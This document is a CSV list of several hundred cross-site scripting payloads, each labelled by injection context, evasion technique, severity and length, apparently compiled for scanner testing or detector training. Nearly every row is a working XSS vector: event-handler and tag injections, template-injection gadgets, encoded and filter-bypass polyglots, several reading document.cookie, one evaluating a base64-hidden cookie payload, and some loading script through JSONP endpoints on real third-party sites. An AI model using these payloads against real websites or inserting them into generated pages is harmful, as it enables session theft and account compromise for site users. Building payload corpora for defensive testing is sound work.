payload,context,technique,severity,length
"a=\""get\"";",generic,none,low,10
%3Csvg%20onload=alert(1)%3E,event_handler,url_encoding,medium,27
"<style>@keyframes x{}</style><multicol style=""animation-name:x"" onanimationend=""alert(1)""></multicol>",tag_injection,none,medium,101
"'\u0029\u0028};alert(document.cookie);//""",dom_sink,unicode_escape,high,41
<noscript onpointerout=alert(1) style=display:block>AnonKryptiQuz</noscript>,tag_injection,none,medium,76
"<plaintext onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</plaintext>",tag_injection,none,medium,77
"{{constructor.constructor(""alert(0)"")()}}",template_injection,none,medium,41
"<hr oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</hr>",tag_injection,none,medium,56
<picture contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,tag_injection,none,medium,61
"<style>:target {color: red;}</style><var id=x style=""transition:color 10s"" ontransitioncancel=print()></var>",tag_injection,none,low,108
<s onpointerenter=alert(1) style=display:block>AnonKryptiQuz</s>,tag_injection,none,medium,64
<svg><details onload=alert(1)></details>,tag_injection,none,medium,40
"<code id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></code>",tag_injection,none,medium,84
"<style>@keyframes x{}</style><marquee style=""animation-name:x"" onanimationstart=""alert(1)""></marquee>",tag_injection,none,medium,101
<option onpointerenter=alert(1) style=display:block>AnonKryptiQuz</option>,tag_injection,none,medium,74
"<img onmousedown=""alert(1)"">AnonKryptiQuz</img>",tag_injection,none,medium,47
"<samp onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</samp>",tag_injection,none,medium,84
"<style>@keyframes x{}</style><ul style=""animation-name:x"" onwebkitanimationend=""alert(1)""></ul>",tag_injection,none,medium,95
<bdo onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</bdo>,tag_injection,none,medium,72
<i onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</i><input value=clickme>,tag_injection,none,medium,102
"<image2 draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</image2>",tag_injection,none,medium,85
"<style>@keyframes x{}</style><html style=""animation-name:x"" onanimationend=""alert(1)""></html>",tag_injection,none,medium,93
"<animatetransform oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</animatetransform>",tag_injection,none,medium,95
"/</title/'/</style/</script/--><p"" onclick=alert()//>*/alert()/*",tag_injection,none,medium,64
"<noembed onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</noembed>",tag_injection,none,medium,75
"<div draggable=""true"" contenteditable>drag me</div><summary ondrop=alert(1) contenteditable>drop here</summary>",tag_injection,none,medium,111
-alert(1)-&apos;,generic,none,medium,16
exp/*&lt;XSS STYLE=&apos;no\xss:noxss(&quot;*//*&quot;);,generic,comment_injection,low,56
"<style>:target {color: red;}</style><spacer id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></spacer>",tag_injection,none,medium,115
"""><script src=data:&comma;alert(1)//",script_injection,none,medium,36
"<noembed id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></noembed>",tag_injection,none,medium,90
"<div draggable=""true"" contenteditable>drag me</div><set ondragover=alert(1) contenteditable style=display:block>drop here</set>",tag_injection,none,medium,127
"<style>@keyframes slidein {}</style><b style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></b>",tag_injection,none,medium,162
"<div style=""binding: url([link to code]);"">",attribute_escape,none,low,43
"<abbr draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</abbr>",tag_injection,none,medium,66
<sup id=x tabindex=1 onfocusin=alert(1)></sup>,tag_injection,none,medium,46
"<article onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</article>",tag_injection,none,medium,72
<object id=x tabindex=1 ondeactivate=alert(1)></object><input id=y autofocus>,tag_injection,none,medium,77
"<style>@keyframes slidein {}</style><img style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></img>",tag_injection,none,medium,160
<option id=x tabindex=1 onfocusin=alert(1)></option>,tag_injection,none,medium,52
"Search/Results?q=""><img src=x onerror=prompt(document.domain);>",dom_sink,none,medium,63
"<div draggable=""true"" contenteditable>drag me</div><script ondragover=alert(1) contenteditable style=display:block>drop here</script>",script_injection,none,medium,133
<nav onpointerleave=alert(1) style=display:block>AnonKryptiQuz</nav>,tag_injection,none,medium,68
"<tt onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</tt>",tag_injection,none,medium,60
<td onpointerdown=alert(1) style=display:block>AnonKryptiQuz</td>,tag_injection,none,medium,65
"<animatemotion onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</animatemotion>",tag_injection,none,medium,87
<span id=x tabindex=1 onfocusin=alert(1)></span>,tag_injection,none,medium,48
"<samp draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</samp>",tag_injection,none,medium,86
<script x>alert('XSS')<script y>,script_injection,none,medium,32
<command onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</command><input value=clickme>,tag_injection,none,medium,114
onpointerover=”alert(‘AnonKryptiQuz’),event_handler,none,medium,37
"<style>:target {transform: rotate(180deg);}</style><img id=x style=""transition:transform 2s"" ontransitionrun=print()></img>",tag_injection,none,low,123
"javascript:alert()//*/alert()/*'-/""/-eval(`(alert())`)//\""-alert()//--></title></style></noscript></textarea></template></noembed><script>alert()</script><frameset onload=alert()><svg/onload=alert(1)> alert()//",dom_sink,encoding,medium,210
"<option onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></option>",tag_injection,none,medium,285
"<IMG SRC=x onvolumechange=""alert(String.fromCharCode(88,83,83))"">",tag_injection,encoding|case_variation,high,65
"<label onmousemove=""alert(1)"">AnonKryptiQuz</label>",tag_injection,none,medium,51
<canvas onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,57
<button popovertarget=x>Click me</button><del ontoggle=alert(1) popover id=x>AnonKryptiQuz</del>,tag_injection,none,medium,96
<output id=x tabindex=1 onactivate=alert(1)></output>,tag_injection,none,medium,53
"<style>@keyframes x{}</style><s style=""animation-name:x"" onwebkitanimationend=""alert(1)""></s>",tag_injection,none,medium,93
"<svg draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</svg>",tag_injection,none,medium,64
"<style>@keyframes x{}</style><summary style=""animation-name:x"" onanimationstart=""alert(1)""></summary>",tag_injection,none,medium,101
"<small onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</small>",tag_injection,none,medium,83
"<div draggable=""true"" contenteditable>drag me</div><time ondrop=alert(1) contenteditable style=display:block>drop here</time>",tag_injection,none,medium,125
"<col onmouseover=""alert(1)"">AnonKryptiQuz</col>",tag_injection,none,medium,47
"<strong onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</strong>",tag_injection,none,medium,65
<hr onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</hr><input value=clickme>,tag_injection,none,medium,95
<abbr onblur=alert(1) tabindex=1 id=x></abbr><input autofocus>,tag_injection,none,medium,62
"<b draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</b>",tag_injection,none,medium,60
"<iframe srcdoc=""&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1)&amp;gt;>"">",js_uri,none,medium,116
"<div draggable=""true"" contenteditable>drag me</div><bdi ondrop=alert(1) contenteditable style=display:block>drop here</bdi>",tag_injection,none,medium,123
"""><img src=x><img src= onerror=prompt(document.domain);>",dom_sink,none,medium,56
</Title/</Style/</Script/</textArea/</iFrame/</noScript>,generic,none,low,56
<img/’onerror=alert(1) src=a>,tag_injection,none,medium,29
"<meta onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</meta>",tag_injection,none,medium,65
"<STYLE TYPE=""text/javascript"">alert(1);</STYLE>",attribute_escape,case_variation,medium,47
"<h1 draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</h1>",tag_injection,none,medium,57
"""><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;",js_uri,none,medium,86
"<sup onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</sup>",tag_injection,none,medium,82
"<colgroup onmouseup=""alert(1)"">AnonKryptiQuz</colgroup>",tag_injection,none,medium,55
"<style>@keyframes x{}</style><fieldset style=""animation-name:x"" onanimationend=""alert(1)""></fieldset>",tag_injection,none,medium,101
"<b onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</b>",tag_injection,none,medium,55
top[/al/.source+/ert/.source](1),generic,none,low,32
<script onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</script><input value=clickme>,script_injection,none,medium,112
"<frameset draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</frameset>",tag_injection,none,medium,69
<legend onpointerup=alert(1) style=display:block>AnonKryptiQuz</legend>,tag_injection,none,medium,71
<rb id=x tabindex=1 onfocus=alert(1)></rb>,tag_injection,none,medium,42
/%09/javascript:alert(1),js_uri,url_encoding,medium,24
"<rt oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</rt>",tag_injection,none,medium,56
<li id=x tabindex=1 onbeforeactivate=alert(1)></li>,tag_injection,none,medium,51
"ABC<div style=""x:\xE2\x80\x89expression(javascript:alert(1)"">DEF",js_uri,none,medium,64
<frameset onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</frameset>,tag_injection,none,medium,82
"<bgsound onmouseleave=""alert(1)"">AnonKryptiQuz</bgsound>",tag_injection,none,medium,56
"<article onmousemove=""alert(1)"">AnonKryptiQuz</article>",tag_injection,none,medium,55
"<DIV STYLE=""background-image: url(&#1;javascript:alert('XSS'))"">",js_uri,html_entity|case_variation,medium,64
&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;,generic,none,low,223
&#x3c;img&#x2f;src&#x2f;onerror=alert('kalendra')&#x3e;,event_handler,html_entity,medium,55
{{constructor.constructor('eval(atob(\'amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5jb29raWUp\'))')()}},template_injection,encoding,high,93
"<p draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</p>",tag_injection,none,medium,58
"<button onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</button>",tag_injection,none,medium,74
"<slot onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</slot>",tag_injection,none,medium,68
"<tr onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</tr>",tag_injection,none,medium,64
<strong onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,56
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><form id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></form>",tag_injection,none,medium,178
"&lt;IMG SRC=`javascript&#058;alert(\""RSnake says, 'AnonKryptiQuz'\"")`&gt;",generic,html_entity,medium,73
<picture onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,57
""">>>>>><marquee>RAnonKryptiQuz</marquee></head><abc%3E</script><script>alert(document.cookie)</script><meta",dom_sink,url_encoding,high,107
<header onpointerup=alert(1) style=display:block>AnonKryptiQuz</header>,tag_injection,none,medium,71
"<tr oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,96
"<article draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</article>",tag_injection,none,medium,72
"<? '=""foo""><x foo='><img src=x onerror=alert(3)//'>//[""'`-->]]>]</div>",tag_injection,none,medium,70
"<video onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</video>",tag_injection,none,medium,69
<aside id=x tabindex=1 onactivate=alert(1)></aside>,tag_injection,none,medium,51
"<body draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</body>",tag_injection,none,medium,86
"<style>@keyframes x{}</style><abbr style=""animation-name:x"" onanimationstart=""alert(1)""></abbr>",tag_injection,none,medium,95
"<legend oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,100
\u003e\u003cimg src=1 onerror=alert(0)\u003e,event_handler,unicode_escape,medium,44
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dialog id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></dialog>",tag_injection,none,medium,182
';parent['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//,attribute_escape,none,low,83
"""><script>alert(“hello”)</script>jnyf0",script_injection,none,medium,38
"""></video>",attribute_escape,none,low,10
"<script onmouseout=""alert(1)"">AnonKryptiQuz</script>",script_injection,none,medium,52
<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'>}},attribute_escape,none,low,68
"<input3 onclick=""alert(1)"" style=display:block>AnonKryptiQuz</input3>",tag_injection,none,medium,69
\'-alert()//,generic,none,medium,12
"<dd onmousemove=""alert(1)"">AnonKryptiQuz</dd>",tag_injection,none,medium,45
<svg onpointerleave=alert(1) style=display:block>AnonKryptiQuz</svg>,tag_injection,none,medium,68
"<xmp oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</xmp>",tag_injection,none,medium,69
<audio src/onerror=alert(1)>,tag_injection,none,medium,28
"<pre draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</pre>",tag_injection,none,medium,82
"<blink oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</blink>",tag_injection,none,medium,73
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><colgroup id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></colgroup>",tag_injection,none,medium,186
"<rp onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</rp>",tag_injection,none,medium,65
"<style>:target {color: red;}</style><frame id=x style=""transition:color 10s"" ontransitioncancel=print()></frame>",tag_injection,none,low,112
"<applet oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,100
<form onpointerout=alert(1) style=display:block>AnonKryptiQuz</form>,tag_injection,none,medium,68
<tt onpointerout=alert(1) style=display:block>AnonKryptiQuz</tt>,tag_injection,none,medium,64
"<i ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</i>",tag_injection,none,medium,83
<SCR%00IPT>alert(1)</SCR%00IPT>,generic,url_encoding|case_variation,medium,31
"<div draggable=""true"" contenteditable>drag me</div><object ondragover=alert(1) contenteditable>drop here</object>",tag_injection,none,medium,113
"<set onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</set>",tag_injection,none,medium,68
"<param ondblclick=""alert(1)"">AnonKryptiQuz</param>",tag_injection,none,medium,50
"<audio oncut=""alert(1)"" contenteditable>AnonKryptiQuz</audio>",tag_injection,none,medium,61
"<kbd onmouseup=""alert(1)"">AnonKryptiQuz</kbd>",tag_injection,none,medium,45
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><multicol id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></multicol>",tag_injection,none,medium,186
"mrco24""type=image src onerror=""alert(1)""",event_handler,none,medium,40
"<img onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</img>",tag_injection,none,medium,81
"<dt ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</dt>",tag_injection,none,medium,85
"<rtc onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</rtc>",tag_injection,none,medium,67
"<figcaption onmouseup=""alert(1)"">AnonKryptiQuz</figcaption>",tag_injection,none,medium,59
<button popovertarget=x>Click me</button><frame ontoggle=alert(1) popover id=x>AnonKryptiQuz</frame>,tag_injection,none,medium,100
"<style>:target {color:red;}</style><pre id=x style=""transition:color 1s"" ontransitionstart=alert(1)></pre>",tag_injection,none,medium,106
"<div draggable=""true"" contenteditable>drag me</div><sub ondrop=alert(1) contenteditable style=display:block>drop here</sub>",tag_injection,none,medium,123
<footer onpointerout=alert(1) style=display:block>AnonKryptiQuz</footer>,tag_injection,none,medium,72
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><time id=x style=""position:absolute;"" onanimationcancel=""print()""></time>",tag_injection,none,low,177
"<% foo><x foo=""%><script>javascript:alert(1)</script>"">",template_injection,none,medium,55
"<dialog onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</dialog>",tag_injection,none,medium,70
"<audio src=""nonexistent.mp3"" onerror=""alert(1)""></audio>",tag_injection,none,medium,56
"<div draggable=""true"" contenteditable>drag me</div><label ondragover=alert(1) contenteditable style=display:block>drop here</label>",tag_injection,none,medium,131
"<pre ondblclick=""alert(1)"">AnonKryptiQuz</pre>",tag_injection,none,medium,46
"<nobr draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</nobr>",tag_injection,none,medium,86
<dfn id=x tabindex=1 onbeforedeactivate=alert(1)></dfn><input autofocus>,tag_injection,none,medium,72
"<rp onmouseleave=""alert(1)"">AnonKryptiQuz</rp>",tag_injection,none,medium,46
"<style>@keyframes x{}</style><textarea style=""animation-name:x"" onanimationstart=""alert(1)""></textarea>",tag_injection,none,medium,103
"<div draggable=""true"" contenteditable>drag me</div><form ondragover=alert(1) contenteditable>drop here</form>",tag_injection,none,medium,109
"<frameset onFocus frameset onFocus=""javascript:javascript:alert(1)""></frameset onFocus>",js_uri,none,medium,87
""";}(document.writeln(decodeURI(location.hash))-""#<iframe src=javascript:alert(document.domain)",dom_sink,none,medium,94
"<iframe src=""http://example.com/"" style=""width:800px; height:350px; border:none; mask: url(#maskForClickjacking);""/>",attribute_escape,none,low,116
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><br id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></br>",tag_injection,none,medium,174
<frame onblur=alert(1) tabindex=1 id=x></frame><input autofocus>,tag_injection,none,medium,64
"<ruby onclick=""alert(1)"">AnonKryptiQuz</ruby>",tag_injection,none,medium,45
"<font oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</font>",tag_injection,none,medium,60
"<style>:target {color:red;}</style><q id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></q>",tag_injection,none,medium,106
"""><img src=x onerror=alert('XSS');>",tag_injection,none,medium,35
"<hr onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</hr>",tag_injection,none,medium,57
“`’><script>\x0Djavascript:alert(document.cookie)</script>,dom_sink,none,high,58
"<label onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</label>",tag_injection,none,medium,68
"<picture draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</picture>",tag_injection,none,medium,92
<abbr onmousewheel=alert(1) style=display:block>requires scrolling,tag_injection,none,medium,66
"<style>@keyframes x{}</style><datalist style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></datalist>",tag_injection,none,medium,109
"#\"";alert(1);//",generic,none,medium,15
"<style>@keyframes x{}</style><meta style=""animation-name:x"" onwebkitanimationend=""alert(1)""></meta>",tag_injection,none,medium,99
"<div draggable=""true"" contenteditable>drag me</div><option ondrop=alert(1) contenteditable>drop here</option>",tag_injection,none,medium,109
"<script>alert(document.head.innerHTML.substr(146,20));</script>",dom_sink,none,high,63
"<style>:target {color:red;}</style><dt id=x style=""transition:color 1s"" ontransitionend=alert(1)></dt>",tag_injection,none,medium,102
"""alert(document.cookie)['script'](2);""",dom_sink,none,high,38
<iframe onpointerout=alert(1) style=display:block>AnonKryptiQuz</iframe>,tag_injection,none,medium,72
"<rp onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</rp>",tag_injection,none,medium,61
<meta onpointerdown=alert(1) style=display:block>AnonKryptiQuz</meta>,tag_injection,none,medium,69
žscriptualert(EXSSE)ž/scriptu,generic,none,medium,29
tagName%2BinnerHTML%2Blocation.hash%3E/*click%20me!#*/alert(document.domain),dom_sink,comment_injection|url_encoding,high,76
<sCript>confirm()</sCript>,script_injection,case_variation,medium,26
"<title onmousemove=""alert(1)"">AnonKryptiQuz</title>",tag_injection,none,medium,51
"<style>@keyframes x{}</style><audio style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></audio>",tag_injection,none,medium,103
&lt;BR SIZE=&quot;&amp;{alert(&apos;XSS&apos;)}&quot;&gt;,generic,none,medium,57
"<li draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</li>",tag_injection,none,medium,60
"<dir draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</dir>",tag_injection,none,medium,64
"%E5%98%8D%E5%98%8A%20""><img src=x onerror=prompt(document.domain);>",dom_sink,url_encoding,medium,67
"<style>:target {transform: rotate(180deg);}</style><acronym id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></acronym>",tag_injection,none,medium,132
"<hr ondblclick=""alert(1)"">AnonKryptiQuz</hr>",tag_injection,none,medium,44
"<style>:target {color:red;}</style><summary id=x style=""transition:color 1s"" ontransitionend=alert(1)></summary>",tag_injection,none,medium,112
"?clickTAG=javascript:alert(1)&TargetAS="",",js_uri,none,medium,41
"<dt onmouseover=""alert(1)"">AnonKryptiQuz</dt>",tag_injection,none,medium,45
"<style>:target {transform: rotate(180deg);}</style><progress id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></progress>",tag_injection,none,medium,134
<listing onpointerleave=alert(1) style=display:block>AnonKryptiQuz</listing>,tag_injection,none,medium,76
"<section draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</section>",tag_injection,none,medium,70
"<menuitem onmouseover=""alert(1)"">AnonKryptiQuz</menuitem>",tag_injection,none,medium,57
"<a draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</a>",tag_injection,none,medium,58
"<style>:target {transform: rotate(180deg);}</style><blink id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></blink>",tag_injection,none,medium,128
"<div draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</div>",tag_injection,none,medium,79
"&lt;DIV STYLE=\""width&#58; expression(alert('XSS'));\""&gt;",generic,html_entity,medium,58
<a autofocus onfocusin=alert(1) href></a>,tag_injection,none,medium,41
"<style>@keyframes slidein {}</style><video style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></video>",tag_injection,none,medium,164
"<style>:target {transform: rotate(180deg);}</style><section id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></section>",tag_injection,none,medium,132
<output onpointerout=alert(1) style=display:block>AnonKryptiQuz</output>,tag_injection,none,medium,72
"<td onclick=""alert(1)"">AnonKryptiQuz</td>",tag_injection,none,medium,41
"<xmp onmouseup=""alert(1)"">AnonKryptiQuz</xmp>",tag_injection,none,medium,45
"<marquee onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</marquee>",tag_injection,none,medium,75
<dfn id=x tabindex=1 onfocus=alert(1)></dfn>,tag_injection,none,medium,44
"<! foo=""><script>javascript:alert(4032)</script>"">",script_injection,none,medium,50
"""><script>alert('AnonKryptiQuz')</script>",script_injection,none,medium,41
"<img draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</img>",tag_injection,none,medium,62
<hgroup onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</hgroup>,tag_injection,none,medium,78
"<style onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</style>",tag_injection,none,medium,85
"<address oncut=""alert(1)"" contenteditable>AnonKryptiQuz</address>",tag_injection,none,medium,65
"<textarea onmousemove=""alert(1)"">AnonKryptiQuz</textarea>",tag_injection,none,medium,57
<thead onblur=alert(1) tabindex=1 id=x></thead><input autofocus>,tag_injection,none,medium,64
"""><img src=x onerror=javascript:alert((A))>",js_uri,none,medium,43
<script\x2F>javascript:alert(5324)</script>,script_injection,none,medium,43
"<bdo onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</bdo>",tag_injection,none,medium,67
%22%3E%3Cd3v%2Fonauxclick%3D%5B2%5D.some%28confirm%29%3Eclick,generic,url_encoding,low,61
<i onpointerdown=alert(1) style=display:block>AnonKryptiQuz</i>,tag_injection,none,medium,63
<x onauxclick=import('//xss/')>click,tag_injection,none,low,36
"<footer onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</footer>",tag_injection,none,medium,71
"<svg onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</svg>",tag_injection,none,medium,82
"<template onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</template>",tag_injection,none,medium,78
javascript:var img=document.createElement('img');img.src='';document.body.appendChild(img);img.onerror=alert(1),dom_sink,none,high,111
<thead id=x tabindex=1 onfocus=alert(1)></thead>,tag_injection,none,medium,48
<button popovertarget=x>Click me</button><progress onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</progress>,tag_injection,none,medium,112
<p/onclick=alert(/INJECTX/)>a,tag_injection,none,medium,29
"<thead oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</thead>",tag_injection,none,medium,73
"""><script+src=""https://www.youku.com/index_cookielist/s/jsonp?callback=alert(1337)""></script>",script_injection,none,medium,93
"<image oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,99
"<;A HREF="";http://0x42.0x0000066.0x7.0x93/"";>;XSS<;/A>;",generic,none,low,55
"<%tag    onmouseover=""(alert('XSS'))""> is invalid. <%br />",attribute_escape,none,medium,58
<button popovertarget=x>Click me</button><b onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</b>,tag_injection,none,medium,98
"<cite onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</cite>",tag_injection,none,medium,81
"<noembed draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</noembed>",tag_injection,none,medium,72
<frame onmousewheel=alert(1) style=display:block>requires scrolling,tag_injection,none,medium,67
"<noembed onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</noembed>",tag_injection,none,medium,71
"<style>:target {color: red;}</style><bdi id=x style=""transition:color 10s"" ontransitioncancel=print()></bdi>",tag_injection,none,low,108
<acronym onpointerdown=alert(1) style=display:block>AnonKryptiQuz</acronym>,tag_injection,none,medium,75
<figure onmousewheel=alert(1) style=display:block>requires scrolling,tag_injection,none,medium,68
"<div draggable=""true"" contenteditable>drag me</div><cite ondragover=alert(1) contenteditable style=display:block>drop here</cite>",tag_injection,none,medium,129
"<hgroup onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</hgroup>",tag_injection,none,medium,73
"""><script+src=""https://api.mixpanel.com/track/?callback=alert(1337)""></script>",script_injection,none,medium,78
"<div draggable=""true"" contenteditable>drag me</div><hr ondragover=alert(1) contenteditable>drop here</hr>",tag_injection,none,medium,105
<meta onpointermove=alert(1) style=display:block>AnonKryptiQuz</meta>,tag_injection,none,medium,69
"<i onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</i>",tag_injection,none,medium,62
